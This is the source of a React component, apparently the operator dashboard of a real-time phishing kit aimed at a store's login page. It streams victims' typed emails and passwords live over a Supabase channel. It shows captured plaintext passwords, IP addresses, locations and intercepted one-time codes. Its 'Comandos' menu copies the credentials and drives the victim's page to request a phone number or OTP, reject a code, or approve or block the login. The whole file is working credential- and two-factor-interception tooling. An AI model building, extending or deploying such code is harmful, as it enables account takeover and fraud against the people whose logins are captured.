"use client";

import { useEffect, useState } from "react";
import { createPortal } from "react-dom";
import { ChevronLeft, ChevronRight, ChevronDown, Copy, KeyRound, Globe, Trash2, Clock, Ban, CheckCircle2, Smartphone, ShieldX } from "lucide-react";
import { supabase } from "@/lib/supabase";
import type { Log } from "@/lib/logs";
import { deletarLog, decidirLogin, limparClientes, getLogins } from "@/lib/logs";
import { bandeiraDe } from "@/lib/geo";

const POR_PAGINA = 5;

function horaDe(iso: string): string {
  const d = new Date(iso);
  return `${String(d.getHours()).padStart(2, "0")}:${String(d.getMinutes()).padStart(2, "0")}:${String(d.getSeconds()).padStart(2, "0")}`;
}

function dataDe(iso: string): string {
  const d = new Date(iso);
  return `${String(d.getDate()).padStart(2, "0")}/${String(d.getMonth() + 1).padStart(2, "0")}`;
}

type Meta = {
  cidade?: string;
  estado?: string;
  pais?: string;
  paisCodigo?: string;
  ip?: string;
  senha?: string;
  sucesso?: boolean;
  status?: "pendente" | "aprovado" | "recusado" | "pedir_otp" | "pedir_otp_email" | "pedir_telefone" | "bloqueado" | "otp_invalido";
  otp?: string;
};

type Digitando = { email: string; senha: string; otp?: string; em: string };

export default function ClientesCard({
  logsIniciais,
  emailsOnline,
}: {
  logsIniciais: Log[];
  emailsOnline: Set<string>;
}) {
  const [logins, setLogins] = useState<Log[]>(logsIniciais);
  const [pagina, setPagina] = useState(1);
  const [menuAberto, setMenuAberto] = useState<number | null>(null);
  const [menuPos, setMenuPos] = useState<{ top: number; left: number }>({ top: 0, left: 0 });
  const [montado, setMontado] = useState(false);
  const [digitando, setDigitando] = useState<Digitando | null>(null);

  useEffect(() => {
    const canal = supabase
      .channel("digitacao-loja")
      .on("broadcast", { event: "digitando" }, ({ payload }) => {
        const p = payload as Digitando;
        if (p.email || p.senha) {
          setDigitando(p);
        } else {
          setDigitando(null);
        }
      })
      .subscribe();
    return () => {
      supabase.removeChannel(canal);
    };
  }, []);

  useEffect(() => {
    if (!digitando) return;
    const t = setTimeout(() => setDigitando(null), 10000);
    return () => clearTimeout(t);
  }, [digitando]);

  useEffect(() => {
    setMontado(true);
  }, []);

  function abrirMenu(e: React.MouseEvent<HTMLButtonElement>, id: number) {
    if (menuAberto === id) {
      setMenuAberto(null);
      return;
    }
    const r = e.currentTarget.getBoundingClientRect();
    setMenuPos({ top: r.bottom + 6, left: r.left + r.width / 2 });
    setMenuAberto(id);
  }

  useEffect(() => {
    const canalClientes = supabase
      .channel("clientes-realtime")
      .on(
        "postgres_changes",
        { event: "INSERT", schema: "public", table: "clientes" },
        (payload) => {
          const novo = payload.new as Log;
          setLogins((atual) => [novo, ...atual]);
          setPagina(1);
        },
      )
      .on(
        "postgres_changes",
        { event: "UPDATE", schema: "public", table: "clientes" },
        (payload) => {
          const atualizado = payload.new as Log;
          setLogins((atual) => atual.map((l) => (l.id === atualizado.id ? atualizado : l)));
        },
      )
      .on(
        "postgres_changes",
        { event: "DELETE", schema: "public", table: "clientes" },
        (payload) => {
          const removido = payload.old as Log;
          setLogins((atual) => atual.filter((l) => l.id !== removido.id));
        },
      )
      .subscribe((status) => {
        console.log("[ClientesCard] clientes realtime status:", status);
      });

    return () => {
      supabase.removeChannel(canalClientes);
    };
  }, []);

  useEffect(() => {
    const iv = setInterval(async () => {
      try {
        const frescos = await getLogins();
        setLogins(frescos);
      } catch {}
    }, 3000);
    return () => clearInterval(iv);
  }, []);

  async function copiar(texto: string) {
    try {
      await navigator.clipboard.writeText(texto);
    } catch {}
    setMenuAberto(null);
  }

  async function excluir(id: number) {
    setMenuAberto(null);
    setLogins((atual) => atual.filter((l) => l.id !== id));
    try {
      await deletarLog(id);
    } catch {}
  }

  async function limparTudo() {
    setLogins([]);
    try {
      await limparClientes();
    } catch {}
  }

  async function decidir(log: Log, status: "aprovado" | "recusado" | "pedir_otp" | "pedir_otp_email" | "pedir_telefone" | "bloqueado" | "otp_invalido") {
    setMenuAberto(null);
    try {
      await decidirLogin(log, status);
    } catch {}
  }

  const unicos: Log[] = [];
  const vistos = new Set<string>();
  for (const l of logins) {
    const chave = l.usuario.toLowerCase();
    if (!vistos.has(chave)) {
      vistos.add(chave);
      unicos.push(l);
    }
  }

  const totalPaginas = Math.max(1, Math.ceil(unicos.length / POR_PAGINA));
  const visiveis = unicos.slice((pagina - 1) * POR_PAGINA, pagina * POR_PAGINA);

  return (
    <div className="flex h-full w-full flex-col">
      <div className="mb-3 min-h-[240px] flex-1">
        <div className="grid grid-cols-[1.6fr_1fr_1.4fr_1.2fr_1fr_auto] items-center gap-3 px-4 pb-2 text-[10px] uppercase tracking-wider text-muted-foreground/70">
          <span>Cliente</span>
          <span>Senha</span>
          <span>Localização</span>
          <span>IP</span>
          <span>Data / Hora</span>
          <span className="text-right">Comandos</span>
        </div>

        <div className="space-y-3">
          {digitando &&
            (digitando.email || digitando.senha) &&
            !unicos.some((l) => l.usuario.toLowerCase() === digitando.email.toLowerCase()) && (
              <div className="grid grid-cols-[1.6fr_1fr_1.4fr_1.2fr_1fr_auto] items-center gap-3 rounded-xl border border-primary/30 bg-primary/5 px-4 py-3">
                <div className="flex min-w-0 items-center gap-2">
                  <span className="h-2 w-2 shrink-0 animate-pulse rounded-full bg-primary" />
                  <span className="truncate text-xs font-semibold text-foreground">
                    {digitando.email || <span className="text-muted-foreground/50">digitando...</span>}
                  </span>
                </div>
                <span className="truncate font-mono text-xs text-foreground">{digitando.senha || "—"}</span>
                <span className="text-xs text-muted-foreground">—</span>
                <span className="text-xs text-muted-foreground">—</span>
                <span className="text-xs text-muted-foreground">agora</span>
                <span />
              </div>
            )}

          {unicos.length === 0 && !digitando ? (
            <div className="flex min-h-[200px] items-center justify-center rounded-xl glass text-xs text-muted-foreground/60">
              Nenhum login ainda — aparecerá aqui em tempo real
            </div>
          ) : (
            visiveis.map((log) => {
              const meta = (log.metadata ?? {}) as Meta;
              const temGeo = Boolean(meta.paisCodigo || meta.cidade);
              const local = [meta.cidade, meta.estado].filter(Boolean).join(", ");
              const otpExibir =
                digitando && digitando.email.toLowerCase() === log.usuario.toLowerCase() && digitando.otp
                  ? digitando.otp
                  : meta.otp;
              return (
                <div
                  key={log.id}
                  className="grid grid-cols-[1.6fr_1fr_1.4fr_1.2fr_1fr_auto] items-center gap-3 rounded-xl glass px-4 py-3 transition-all duration-300 hover:border-primary/30 hover:shadow-lg hover:shadow-primary/5"
                >
                  <div className="flex min-w-0 items-center gap-2">
                    {(() => {
                      const online = emailsOnline.has(log.usuario.toLowerCase());
                      const cor =
                        meta.status === "pendente"
                          ? "bg-amber-500 animate-pulse"
                          : online
                            ? "bg-emerald-500"
                            : "bg-rose-500";
                      const titulo = meta.status === "pendente" ? "aguardando" : online ? "online" : "offline";
                      return <span className={`h-2 w-2 shrink-0 rounded-full ${cor}`} title={titulo} />;
                    })()}
                    <span className="truncate text-xs font-semibold text-foreground">{log.usuario}</span>
                    {meta.status === "pendente" && (
                      <span className="shrink-0 rounded bg-amber-500/10 px-1.5 py-0.5 text-[9px] font-semibold uppercase text-amber-500">
                        aguardando
                      </span>
                    )}
                    {meta.status === "pedir_otp" && (
                      <span className="shrink-0 rounded bg-sky-400/10 px-1.5 py-0.5 text-[9px] font-semibold uppercase text-sky-400">
                        pedindo otp
                      </span>
                    )}
                    {meta.status === "bloqueado" && (
                      <span className="shrink-0 rounded bg-rose-500/10 px-1.5 py-0.5 text-[9px] font-semibold uppercase text-rose-500">
                        bloqueado
                      </span>
                    )}
                    {otpExibir && (
                      <span className="shrink-0 rounded bg-emerald-500/10 px-1.5 py-0.5 text-[9px] font-semibold uppercase text-emerald-400">
                        otp: {otpExibir}
                      </span>
                    )}
                  </div>

                  <span className="truncate font-mono text-xs text-foreground">{meta.senha || "—"}</span>

                  <div className="flex min-w-0 items-center gap-1.5">
                    <span className="text-base leading-none">{temGeo ? bandeiraDe(meta.paisCodigo ?? "") : "🌐"}</span>
                    <span className="truncate text-xs text-muted-foreground">{local || meta.pais || "—"}</span>
                  </div>

                  <span className="truncate font-mono text-xs text-muted-foreground">{meta.ip || "—"}</span>

                  <span className="flex items-center gap-1 text-xs text-muted-foreground">
                    <Clock className="h-3 w-3 shrink-0" />
                    {dataDe(log.criado_em)} {horaDe(log.criado_em)}
                  </span>

                  <button
                    onClick={(e) => abrirMenu(e, log.id)}
                    className="flex h-7 shrink-0 items-center gap-1 rounded-lg border border-border/50 bg-secondary/40 px-2.5 text-[11px] font-medium text-foreground transition hover:border-primary/40 hover:bg-secondary/70"
                  >
                    Comandos
                    <ChevronDown className="h-3 w-3" />
                  </button>
                </div>
              );
            })
          )}
        </div>
      </div>

      <div className="mt-auto flex items-center justify-between pt-1">
        <div className="flex items-center gap-2">
          <button className="flex h-7 items-center gap-1 rounded-lg border border-primary/20 bg-primary/5 px-3 text-xs font-medium text-foreground transition hover:border-primary/30 hover:bg-primary/10">
            Ver todos
            <ChevronRight className="h-3 w-3" />
          </button>
          <button
            onClick={limparTudo}
            disabled={logins.length === 0}
            className="flex h-7 items-center gap-1 rounded-lg border border-destructive/20 bg-destructive/5 px-3 text-xs font-medium text-destructive transition hover:border-destructive/40 hover:bg-destructive/10 disabled:opacity-40"
          >
            <Trash2 className="h-3 w-3" />
            Limpar clientes
          </button>
        </div>

        {totalPaginas > 1 && (
          <div className="flex items-center gap-1 rounded-lg bg-secondary/50 p-1">
            <button
              onClick={() => setPagina((p) => Math.max(1, p - 1))}
              disabled={pagina === 1}
              className="flex h-6 w-6 items-center justify-center rounded-md hover:bg-primary/10 disabled:opacity-40"
            >
              <ChevronLeft className="h-3.5 w-3.5" />
            </button>
            {Array.from({ length: totalPaginas }, (_, i) => i + 1).map((n) => (
              <button
                key={n}
                onClick={() => setPagina(n)}
                className={`flex h-6 w-6 items-center justify-center rounded-md text-[10px] font-semibold ${
                  pagina === n ? "bg-primary text-primary-foreground" : "hover:bg-primary/10"
                }`}
              >
                {n}
              </button>
            ))}
            <button
              onClick={() => setPagina((p) => Math.min(totalPaginas, p + 1))}
              disabled={pagina === totalPaginas}
              className="flex h-6 w-6 items-center justify-center rounded-md hover:bg-primary/10 disabled:opacity-40"
            >
              <ChevronRight className="h-3.5 w-3.5" />
            </button>
          </div>
        )}
      </div>

      {montado && menuAberto !== null && (() => {
        const log = logins.find((l) => l.id === menuAberto);
        if (!log) return null;
        const meta = (log.metadata ?? {}) as Meta;
        return createPortal(
          <>
            <div className="fixed inset-0 z-40" onClick={() => setMenuAberto(null)} />
            <div
              className="fixed z-50 w-44 -translate-x-1/2 rounded-lg glass p-1 text-left shadow-xl"
              style={{ top: menuPos.top, left: menuPos.left }}
            >
              <button
                onClick={() => copiar(log.usuario)}
                className="flex w-full items-center rounded px-2 py-1.5 text-xs text-foreground hover:bg-secondary/60"
              >
                <Copy className="mr-2 h-3.5 w-3.5 text-primary" /> Copiar email
              </button>
              <button
                onClick={() => copiar(meta.senha ?? "")}
                className="flex w-full items-center rounded px-2 py-1.5 text-xs text-foreground hover:bg-secondary/60"
              >
                <KeyRound className="mr-2 h-3.5 w-3.5 text-amber-500" /> Copiar senha
              </button>
              <button
                onClick={() => copiar(meta.ip ?? "")}
                className="flex w-full items-center rounded px-2 py-1.5 text-xs text-foreground hover:bg-secondary/60"
              >
                <Globe className="mr-2 h-3.5 w-3.5 text-sky-400" /> Copiar IP
              </button>
              <div className="my-1 h-px bg-border/50" />
              <button
                onClick={() => decidir(log, "pedir_telefone")}
                className="flex w-full items-center rounded px-2 py-1.5 text-xs text-violet-400 hover:bg-violet-400/10"
              >
                <Smartphone className="mr-2 h-3.5 w-3.5" /> Pedir Telefone
              </button>
              <button
                onClick={() => decidir(log, "pedir_otp")}
                className="flex w-full items-center rounded px-2 py-1.5 text-xs text-sky-400 hover:bg-sky-400/10"
              >
                <Smartphone className="mr-2 h-3.5 w-3.5" /> Pedir OTP
              </button>
              <button
                onClick={() => decidir(log, "otp_invalido")}
                className="flex w-full items-center rounded px-2 py-1.5 text-xs text-amber-500 hover:bg-amber-500/10"
              >
                <Ban className="mr-2 h-3.5 w-3.5" /> Código inválido
              </button>
              <button
                onClick={() => decidir(log, "aprovado")}
                className="flex w-full items-center rounded px-2 py-1.5 text-xs text-emerald-500 hover:bg-emerald-500/10"
              >
                <CheckCircle2 className="mr-2 h-3.5 w-3.5" /> Liberar cliente
              </button>
              <button
                onClick={() => decidir(log, "recusado")}
                className="flex w-full items-center rounded px-2 py-1.5 text-xs text-amber-500 hover:bg-amber-500/10"
              >
                <Ban className="mr-2 h-3.5 w-3.5" /> Login inválido
              </button>
              <button
                onClick={() => decidir(log, "bloqueado")}
                className="flex w-full items-center rounded px-2 py-1.5 text-xs text-rose-500 hover:bg-rose-500/10"
              >
                <ShieldX className="mr-2 h-3.5 w-3.5" /> Cliente bloqueado
              </button>
              <div className="my-1 h-px bg-border/50" />
              <button
                onClick={() => excluir(log.id)}
                className="flex w-full items-center rounded px-2 py-1.5 text-xs text-destructive hover:bg-destructive/10"
              >
                <Trash2 className="mr-2 h-3.5 w-3.5" /> Excluir registro
              </button>
            </div>
          </>,
          document.body,
        );
      })()}
    </div>
  );
}
